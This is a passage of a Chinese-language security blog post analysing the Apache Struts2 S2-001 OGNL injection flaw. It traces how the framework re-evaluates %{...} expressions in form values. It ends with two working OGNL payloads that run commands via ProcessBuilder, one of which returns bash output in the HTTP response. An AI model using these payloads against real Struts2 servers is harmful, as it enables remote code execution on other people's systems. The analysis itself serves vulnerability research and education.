+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">execute</span><span class="p">:</span><span class="n">50</span><span class="p">,</span><span class="w"> </span><span class="n">StrutsActionProxy</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">struts2</span><span class="p">.</span><span class="na">impl</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">serviceAction</span><span class="p">:</span><span class="n">504</span><span class="p">,</span><span class="w"> </span><span class="n">Dispatcher</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">struts2</span><span class="p">.</span><span class="na">dispatcher</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doFilter</span><span class="p">:</span><span class="n">419</span><span class="p">,</span><span class="w"> </span><span class="n">FilterDispatcher</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">struts2</span><span class="p">.</span><span class="na">dispatcher</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">internalDoFilter</span><span class="p">:</span><span class="n">193</span><span class="p">,</span><span class="w"> </span><span class="n">ApplicationFilterChain</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">core</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doFilter</span><span class="p">:</span><span class="n">166</span><span class="p">,</span><span class="w"> </span><span class="n">ApplicationFilterChain</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">core</span><span class="p">)</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在一个类中进行了对应的迭代器判断<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160000403.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+一直到迭代器为<code>params</code>为止，跟进。跟进之后会到<code>ParameterInterceptor.doIntercept()</code>方法处<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160002064.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+跟进到<code>setParameters()</code>方法里面，再从这里面进<code>setValue()</code>方法，为什么要跟进<code>setValue()</code>方法？因为上面的注释中写到了，OGNL 的语句会被送到<code>OgnlValueStack#setValue</code>处进行处理<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160006049.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+一直跟进<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007204.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160007364.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+经历了一系列的迭代器之后，所有迭代器处理完毕了，执行了<code>invokeActionOnly()</code>方法<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410160012314.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+通过反射调用执行了<code>action</code>实现类里的<code>execute</code>方法，开始处理用户的逻辑信息。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162310496.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+处理完毕用户的逻辑信息之后，我们继续往下走，跟进<code>executeResult()</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162311571.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+首先<code>createResult()</code>这里创建了一个<code>Result</code>对象，对应的方法<code>com.opensymphony.xwork2.DefaultActionInvocation#createResult</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162314918.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+如果当时调用了<code>Action</code>返回了<code>Result</code>对象，则直接返回；否则，通过<code>proxy</code>对象获取配置信息，根据 resultCode 获取到<code>Result</code>对象。<br>
+继续往下走，<code>executeResult()</code>方法中调用了<code>execute()</code>方法；跟进<code>doExecute()</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162316654.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+准备执行环境: <code>request, pageContext</code>等等后，发送真正的响应信息，可以看到我们自己配置时候返回结果是 <code>jsp</code> 文件<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162317142.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+之后调用了<code>JspServlet</code>来处理请求，在解析标签的时候，在标签的开始和结束位置，会分别调用对应实现类如<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>中的<code>doStartTag()</code>及<code>doEndTag()</code>，这里会调用组件<code>org.apache.struts2.components.UIBean</code>的<code>end()</code>方法<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162324991.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+跟进<code>evaluateParams()</code>方法<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162326391.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+由于<code>altSyntax</code>默认开启了，接下来会调用<code>findValue()</code>方法寻找参数值<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162327320.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+继续跟进<code>translateVariables()</code>方法<br>
+最终触发点是<code>TextParseUtil#translateVariables</code>，在此处下了断点之后，可以看到依次进入了好几次，不同时候的<code>expression</code>的值都会有所不同，我们找到值为<code>password</code>时开始分析。<br>
+经过两次如下的代码之后，将生成 OGNL 表达式，返回了<code>%{password}</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">XWorkConverter</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">convertValue</span><span class="p">(</span><span class="n">stack</span><span class="p">.</span><span class="na">getContext</span><span class="p">(),</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">asType</span><span class="p">);</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这次判断不会直接走到<code>return</code>，来到后面，取出<code>%{password}</code>中间的值<code>password</code>赋值给<code>var</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410162349232.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+然后通过<code>Object o = stack.findValue(var,asType)</code>获得到<code>password</code>的值为<code>%{1+1}</code><br>
+然后重新赋值给 expression，进行下一次循环<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410170005646.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+在这一次循环的时候，就再次解析了<code>%{1+1}</code>这个<code>OGNL</code>表达式，并将其赋值给了<code>o</code><br>
+最后<code>expression</code>的值就变成了2，不是 OGNL 表达式时就会直接进入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">XWorkConverter</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">convertValue</span><span class="p">(</span><span class="n">stack</span><span class="p">.</span><span class="na">getContext</span><span class="p">(),</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">asType</span><span class="p">);</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后返回并显示在表达那种，这是含有 OGNL 表达式的处理，比正常的处理多了OGNL这一部分，所以 Struts2 的运行流程到此结束。</p>
+<h3 id="漏洞利用" class="heading-element"><span>漏洞利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">%</span><span class="p">{(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">})).</span><span class="na">start</span><span class="p">()}</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">%</span><span class="p">{</span><span class="err">#</span><span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;bash&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">})).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">(),</span><span class="err">#</span><span class="n">b</span><span class="o">=</span><span class="err">#</span><span class="n">a</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="err">#</span><span class="n">c</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InputStreamReader</span><span class="p">(</span><span class="err">#</span><span class="n">b</span><span class="p">),</span><span class="err">#</span><span class="n">d</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">BufferedReader</span><span class="p">(</span><span class="err">#</span><span class="n">c</span><span class="p">),</span><span class="err">#</span><span class="n">e</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[</span><span class="n">50000</span><span class="o">]</span><span class="p">,</span><span class="err">#</span><span class="n">d</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="err">#</span><span class="n">e</span><span class="p">),</span><span class="err">#</span><span class="n">f</span><span class="o">=</span><span class="err">#</span><span class="n">context</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;</span><span class="p">),</span><span class="err">#</span><span class="n">f</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="p">(</span><span class="err">#</span><span class="n">e</span><span class="p">)),</span><span class="err">#</span><span class="n">f</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">flush</span><span class="p">(),</span><span class="err">#</span><span class="n">f</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">close</span><span class="p">()}</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-11-15 13:47:01">Updated on 2024-11-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/javastruts2%E7%B3%BB%E5%88%97-s2-001/" data-title="JavaStruts2系列-S2-001"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/struts2/" class="post-tag" title="Tags - Struts2">Struts2</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%89/" class="post-nav-item" rel="prev" title="Jackson反序列化（三）"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Jackson反序列化（三）</a><a href="/javastruts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-nav-item" rel="next" title="JavaStruts2 学习与环境搭建">JavaStruts2 学习与环境搭建<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.16"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00","version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
